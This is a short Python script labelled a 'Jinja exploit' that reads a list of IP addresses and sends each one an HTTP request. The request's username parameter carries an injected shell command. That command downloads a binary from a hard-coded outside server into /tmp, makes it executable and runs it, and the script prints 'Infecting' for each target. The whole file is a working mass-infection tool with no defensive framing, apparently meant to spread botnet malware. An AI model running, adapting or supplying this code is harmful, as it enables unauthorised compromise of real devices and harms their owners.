#usr/bin/python
#Jinja exploit by Skypierr
#Jinka uses port 4444
import threading, sys, time, random, socket, subprocess, re, os, struct, array, requests
from threading import Thread
from time import sleep
import requests
from requests.auth import HTTPDigestAuth
from decimal import *
ips = open(sys.argv[1], "r").readlines()
payload = "?username=cd%20/tmp;wget%20http://185.244.25.254/bins/x86;cat%20x86%20>%20jin;chmod%20777%20jin;./jin%20Jinja"

class load(threading.Thread):
  def __init__ (self, ip):
    threading.Thread.__init__(self)
    self.ip = str(ip).rstrip('\n')
  def run(self):
    try:
      url = "http://" + self.ip + "/" + payload
      requests.get(url, timeout=5)
      print("[Jinja] Infecting - " + self.ip)
    except Exception as e:
      pass

for ip in ips:
  try:
    n = load(ip)
    n.start()
  except:
    pass